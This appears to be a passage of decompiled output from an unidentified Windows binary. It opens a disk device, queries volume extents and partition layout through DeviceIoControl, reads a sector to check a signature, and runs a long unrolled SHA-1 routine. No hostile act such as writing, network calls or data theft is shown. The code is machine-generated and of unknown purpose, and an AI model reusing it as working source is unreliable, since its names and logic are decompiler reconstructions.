  undefined4 local_40e;
  undefined4 local_40a;
  undefined2 local_406;
  undefined auStack_404 [8];
  undefined4 uStack_3fc;
  uint uStack_3f4;
  uint uStack_3f0;
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&DStack_438;
  local_430 = DAT_0041de9c;
  local_42a = 0;
  local_426 = 0;
  local_422 = 0;
  local_41e = 0;
  local_41a = 0;
  local_416 = 0;
  local_412 = 0;
  local_40e = 0;
  local_40a = 0;
  local_406 = 0;
  local_434._0_2_ = (short)DAT_0041de98;
  local_434 = CONCAT22((short)((uint)DAT_0041de98 >> 0x10),(short)local_434 + param_1);
  local_42c = L'\0';
  FUN_00404100(&local_434,&local_42c,0x41dea0);
  hDevice = CreateFileW(&local_42c,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  uVar2 = extraout_EDX;
  if (hDevice != (HANDLE)0xffffffff) {
    BVar1 = DeviceIoControl(hDevice,0x560000,(LPVOID)0x0,0,auStack_404,0x400,&DStack_438,
                            (LPOVERLAPPED)0x0);
    uVar2 = extraout_EDX_00;
    if (BVar1 != 0) {
      uVar3 = FUN_00417790(uStack_3f4,uStack_3f0,0x200,0);
      uVar2 = (undefined4)((ulonglong)uVar3 >> 0x20);
      *unaff_EBX = uStack_3fc;
    }
  }
  if (hDevice != (HANDLE)0x0) {
    CloseHandle(hDevice);
    uVar2 = extraout_EDX_01;
  }
  FUN_0040a982(local_4 ^ (uint)&DStack_438,uVar2);
  return;
}



undefined4 __cdecl FUN_00403fc0(HANDLE param_1)

{
  int iVar1;
  uint uVar2;
  LPVOID lpOutBuffer;
  BOOL BVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  undefined8 uVar8;
  undefined4 uStack_10;
  DWORD DStack_c;
  uint uStack_8;
  
  Sleep(100);
  iVar6 = 0;
  iVar7 = 0;
  uVar5 = 0;
  uStack_10 = 0;
  uStack_8 = 0;
  if (param_1 != (HANDLE)0xffffffff) {
    lpOutBuffer = (LPVOID)FUN_0040b8c1(0xc00);
    BVar3 = DeviceIoControl(param_1,0x70050,(LPVOID)0x0,0,lpOutBuffer,0xc00,&DStack_c,
                            (LPOVERLAPPED)0x0);
    if (BVar3 != 0) {
      iVar1 = *(int *)((int)lpOutBuffer + 0x3c);
      uVar4 = uStack_8;
      if ((-1 < iVar1) && ((0 < iVar1 || (*(uint *)((int)lpOutBuffer + 0x38) != 0)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0x40);
        iVar6 = *(int *)((int)lpOutBuffer + 0x44);
        uVar4 = *(uint *)((int)lpOutBuffer + 0x38);
        iVar7 = iVar1;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0xcc);
      uVar2 = *(uint *)((int)lpOutBuffer + 200);
      if ((iVar7 <= iVar1) && ((iVar7 < iVar1 || (uVar4 < uVar2)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0xd0);
        iVar6 = *(int *)((int)lpOutBuffer + 0xd4);
        uVar4 = uVar2;
        iVar7 = iVar1;
        uStack_8 = uVar2;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0x15c);
      uVar2 = *(uint *)((int)lpOutBuffer + 0x158);
      if ((iVar7 <= iVar1) && ((iVar7 < iVar1 || (uVar4 < uVar2)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0x160);
        iVar6 = *(int *)((int)lpOutBuffer + 0x164);
        uVar4 = uVar2;
        iVar7 = iVar1;
        uStack_8 = uVar2;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0x1ec);
      uVar2 = *(uint *)((int)lpOutBuffer + 0x1e8);
      if ((iVar7 <= iVar1) && ((iVar7 < iVar1 || (uVar4 < uVar2)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0x1f0);
        iVar6 = *(int *)((int)lpOutBuffer + 500);
        uVar4 = uVar2;
        iVar7 = iVar1;
        uStack_8 = uVar2;
      }
      uVar8 = FUN_00417790(uVar5 + uVar4,iVar6 + iVar7 + (uint)CARRY4(uVar5,uVar4),0x200,0);
      uStack_10 = (undefined4)uVar8;
    }
    if (lpOutBuffer != (LPVOID)0x0) {
      FUN_0040b6ac();
    }
  }
  Sleep(100);
  return uStack_10;
}



void __fastcall FUN_00404100(undefined4 param_1,undefined2 *param_2,int param_3)

{
  FUN_0040b83a(param_2,0x14,param_3,&stack0x00000008);
  return;
}



undefined4 __cdecl FUN_00404120(undefined4 *param_1)

{
  short sVar1;
  HANDLE in_EAX;
  undefined (*pauVar2) [16];
  uint uVar3;
  int iVar4;
  short *psVar5;
  undefined4 uVar6;
  undefined (*pauVar7) [16];
  
  uVar6 = 0;
  if (in_EAX == (HANDLE)0xffffffff) {
    return 0;
  }
  pauVar2 = (undefined (*) [16])FUN_0040b8c1(0x400);
  FUN_0040f8c0(pauVar2,0,0x400);
  uVar3 = FUN_00403fc0(in_EAX);
  iVar4 = FUN_00403d90(uVar3,pauVar2);
  if (iVar4 == 0) goto LAB_004041d5;
  if (*(int *)(*pauVar2 + 4) == 0x5042475f) {
    psVar5 = (short *)(pauVar2[0x10] + 0xe);
    do {
      sVar1 = *psVar5;
      psVar5 = psVar5 + 1;
    } while (sVar1 != 0);
    if ((int)psVar5 - (int)(pauVar2 + 0x11) >> 1 == 0) goto LAB_00404191;
  }
  else {
LAB_00404191:
    iVar4 = FUN_00403d90(0x1e,pauVar2);
    if ((iVar4 == 0) || (*(int *)(*pauVar2 + 4) != 0x5042475f)) goto LAB_004041d5;
    psVar5 = (short *)(pauVar2[0x10] + 0xe);
    do {
      sVar1 = *psVar5;
      psVar5 = psVar5 + 1;
    } while (sVar1 != 0);
    if ((int)psVar5 - (int)(pauVar2 + 0x11) >> 1 == 0) goto LAB_004041d5;
  }
  pauVar7 = pauVar2;
  for (iVar4 = 0x8d; iVar4 != 0; iVar4 = iVar4 + -1) {
    *param_1 = *(undefined4 *)*pauVar7;
    pauVar7 = (undefined (*) [16])(*pauVar7 + 4);
    param_1 = param_1 + 1;
  }
  *(undefined2 *)param_1 = *(undefined2 *)*pauVar7;
  uVar6 = 1;
LAB_004041d5:
  if (pauVar2 != (undefined (*) [16])0x0) {
    FUN_0040b6ac();
  }
  return uVar6;
}



void FUN_004041f0(void)

{
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 *unaff_ESI;
  undefined8 uVar1;
  undefined4 local_218;
  WCHAR local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&local_218;
  local_214 = L'\0';
  FUN_0040f8c0((undefined (*) [16])local_212,0,0x206);
  local_218 = 0;
  GetSystemDirectoryW(&local_214,0x104);
  FUN_00403eb0(local_214 + L'﾿');
  uVar1 = FUN_00403df0(extraout_ECX,extraout_EDX);
  if ((int)uVar1 == -1) {
    FUN_0040a982(local_8 ^ (uint)&local_218,(int)((ulonglong)uVar1 >> 0x20));
    return;
  }
  FUN_00404120(unaff_ESI);
  FUN_0040a982(local_8 ^ (uint)&local_218,extraout_EDX_00);
  return;
}



void FUN_004042a0(void)

{
  int in_EAX;
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  
  uVar1 = *(uint *)(in_EAX + 8);
  uVar3 = *(uint *)(in_EAX + 0xc);
  uVar7 = *(uint *)(in_EAX + 0x10);
  uVar5 = uVar3 >> 2 | uVar3 << 0x1e;
  uVar3 = (uVar1 >> 0x1b | uVar1 << 5) +
          ((*(uint *)(in_EAX + 0x14) ^ uVar7) & uVar3 ^ *(uint *)(in_EAX + 0x14)) +
          *(int *)(in_EAX + 0x18) + 0x5a827999 + *(int *)(in_EAX + 0x1c);
  uVar2 = *(int *)(in_EAX + 0x14) + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar7 ^ uVar5) & uVar1 ^ uVar7) +
          *(int *)(in_EAX + 0x20);
  uVar1 = uVar1 >> 2 | uVar1 << 0x1e;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar7 + 0x5a827999 +
          ((uVar5 ^ uVar1) & uVar3 ^ uVar5) +
          (uVar2 >> 0x1b | uVar2 * 0x20) + *(int *)(in_EAX + 0x24);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = uVar5 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar4 ^ uVar1) & uVar2 ^ uVar1) +
          *(int *)(in_EAX + 0x28);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar1 = (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar4 ^ uVar6) & uVar3 ^ uVar4) +
          *(int *)(in_EAX + 0x2c) + 0x5a827999 + uVar1;
  uVar3 = uVar4 + 0x5a827999 +
          (uVar1 >> 0x1b | uVar1 * 0x20) + ((uVar6 ^ uVar7) & uVar2 ^ uVar6) +
          *(int *)(in_EAX + 0x30);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar2 = uVar6 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar7 ^ uVar5) & uVar1 ^ uVar7) +
          *(int *)(in_EAX + 0x34);
  uVar7 = (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar5 ^ uVar4) & uVar3 ^ uVar5) +
          *(int *)(in_EAX + 0x38) + 0x5a827999 + uVar7;
  uVar1 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar5 + 0x5a827999 +
          ((uVar1 ^ uVar4) & uVar2 ^ uVar4) +
          (uVar7 >> 0x1b | uVar7 * 0x20) + *(int *)(in_EAX + 0x3c);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar8 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar2 = uVar4 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar1 ^ uVar6) & uVar7 ^ uVar1) +
          *(int *)(in_EAX + 0x40);
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar1 = (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar6 ^ uVar8) & uVar3 ^ uVar6) +
          *(int *)(in_EAX + 0x44) + 0x5a827999 + uVar1;
  uVar7 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar3 = uVar6 + 0x5a827999 +
          (uVar1 >> 0x1b | uVar1 * 0x20) + ((uVar8 ^ uVar5) & uVar2 ^ uVar8) +
          *(int *)(in_EAX + 0x48);
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar2 = uVar8 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar5 ^ uVar7) & uVar1 ^ uVar5) +
          *(int *)(in_EAX + 0x4c);
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x24) ^
          *(uint *)(in_EAX + 0x1c);
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar5 + 0x5a827999 +
          ((uVar4 ^ uVar7) & uVar3 ^ uVar7) +
          (uVar2 >> 0x1b | uVar2 * 0x20) + *(uint *)(in_EAX + 0x50);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = uVar7 + 0x5a827999 +
          (uVar3 >> 0x1b | uVar3 * 0x20) + ((uVar4 ^ uVar6) & uVar2 ^ uVar4) +
          *(int *)(in_EAX + 0x54);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar1;
  uVar3 = uVar4 + 0x5a827999 +
          (uVar2 >> 0x1b | uVar2 * 0x20) + ((uVar6 ^ uVar5) & uVar3 ^ uVar6) +
          *(int *)(in_EAX + 0x58);
  uVar1 = uVar6 + 0x5a827999 +
          ((uVar5 ^ uVar7) & uVar2 ^ uVar5) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x20) = uVar2;
  uVar2 = uVar5 + 0x5a827999 +
          ((uVar7 ^ uVar4) & uVar3 ^ uVar7) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar2;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x24) = uVar3;
  uVar3 = uVar7 + 0x5a827999 +
          ((uVar6 ^ uVar4) & uVar1 ^ uVar4) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar3;
  uVar5 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x28) = uVar1;
  uVar1 = uVar4 + 0x5a827999 +
          ((uVar6 ^ uVar5) & uVar2 ^ uVar6) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar2;
  uVar7 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar6 + 0x6ed9eba1 + (uVar5 ^ uVar4 ^ uVar3) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar2;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x30) = uVar3;
  uVar3 = uVar5 + 0x6ed9eba1 + (uVar4 ^ uVar6 ^ uVar1) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar3;
  uVar7 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x34) = uVar1;
  uVar1 = uVar4 + 0x6ed9eba1 + (uVar2 ^ uVar6 ^ uVar7) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x38) = uVar2;
  uVar2 = uVar6 + 0x6ed9eba1 + (uVar4 ^ uVar3 ^ uVar7) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar2;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar3;
  uVar3 = uVar7 + 0x6ed9eba1 + (uVar4 ^ uVar6 ^ uVar1) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar3;
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x40) = uVar1;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x44) = uVar7;
  uVar2 = uVar4 + 0x6ed9eba1 + (uVar6 ^ uVar8 ^ uVar2) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar1 = uVar6 + 0x6ed9eba1 + (uVar8 ^ uVar5 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar7;
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x48) = uVar3;
  uVar3 = uVar8 + 0x6ed9eba1 + (uVar2 ^ uVar5 ^ uVar7) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar3;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar2;
  uVar2 = uVar5 + 0x6ed9eba1 + (uVar4 ^ uVar1 ^ uVar7) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar2;
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x50) = uVar1;
  uVar1 = uVar7 + 0x6ed9eba1 + (uVar4 ^ uVar8 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x54) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x58) = uVar7;
  uVar3 = uVar4 + 0x6ed9eba1 + (uVar8 ^ uVar6 ^ uVar2) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar3;
  uVar2 = uVar8 + 0x6ed9eba1 + (uVar6 ^ uVar5 ^ uVar1) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar7;
  uVar7 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x24);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar1;
  uVar1 = uVar6 + 0x6ed9eba1 + (uVar3 ^ uVar5 ^ uVar7) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x20) = uVar3;
  uVar3 = uVar5 + 0x6ed9eba1 + (uVar4 ^ uVar2 ^ uVar7) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar3;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x24) = uVar2;
  uVar2 = uVar7 + 0x6ed9eba1 + (uVar4 ^ uVar6 ^ uVar1) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar2;
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x28) = uVar1;
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar4 + 0x6ed9eba1 + (uVar6 ^ uVar8 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar1;
  uVar1 = uVar6 + 0x6ed9eba1 + (uVar8 ^ uVar5 ^ uVar2) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar1;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x30) = uVar2;
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar8 + 0x6ed9eba1 + (uVar3 ^ uVar5 ^ uVar6) + (uVar1 >> 0x1b | uVar1 * 0x20) + uVar2;
  uVar2 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x34) = uVar2;
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar2 = uVar5 + 0x6ed9eba1 + (uVar9 ^ uVar1 ^ uVar6) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar2;
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x38) = uVar1;
  uVar1 = uVar6 + 0x6ed9eba1 + (uVar9 ^ uVar4 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar3;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar3 = (uVar1 >> 0x1b | uVar1 * 0x20) + 0x8f1bbcdc +
          ((uVar6 ^ uVar2) & uVar4 | uVar6 & uVar2) + uVar3 + uVar9;
  uVar2 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x40) = uVar2;
  uVar7 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = ((uVar5 ^ uVar1) & uVar6 | uVar5 & uVar1) + uVar2 + uVar4 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x44) = uVar1;
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar3 = ((uVar3 ^ uVar8) & uVar5 | uVar3 & uVar8) + uVar1 + uVar6 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x48) = uVar7;
  uVar1 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar4 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0x8f1bbcdc +
          ((uVar9 ^ uVar2) & uVar8 | uVar9 & uVar2) + uVar7 + uVar5;
  *(uint *)(in_EAX + 0x4c) = uVar4;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = ((uVar1 ^ uVar3) & uVar9 | uVar1 & uVar3) + uVar4 + uVar8 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x50) = uVar7;
  uVar4 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = ((uVar5 ^ uVar2) & uVar1 | uVar5 & uVar2) + uVar7 + uVar9 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = ((uVar8 ^ uVar3) & uVar5 | uVar8 & uVar3) + uVar4 + uVar1 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x54) = uVar4;
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x58) = uVar3;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x24);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar7;
  uVar3 = ((uVar2 ^ uVar9) & uVar8 | uVar2 & uVar9) + uVar3 + uVar5 + -0x70e44324 +
          (uVar1 >> 0x1b | uVar1 * 0x20);
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar5 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x20) = uVar5;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0x8f1bbcdc +
          ((uVar6 ^ uVar1) & uVar9 | uVar6 & uVar1) + uVar7 + uVar8;
  uVar1 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
